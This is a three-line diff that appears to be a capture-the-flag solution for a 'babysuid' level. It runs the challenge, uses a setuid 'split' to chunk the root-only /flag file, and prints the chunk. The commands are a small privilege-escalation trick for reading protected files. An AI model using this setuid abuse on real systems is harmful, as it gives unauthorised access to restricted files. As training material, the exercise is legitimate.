@@ -1,0 +1,3 @@
+/challenge/babysuid_level16
+split --verbose /flag
+cat xaa
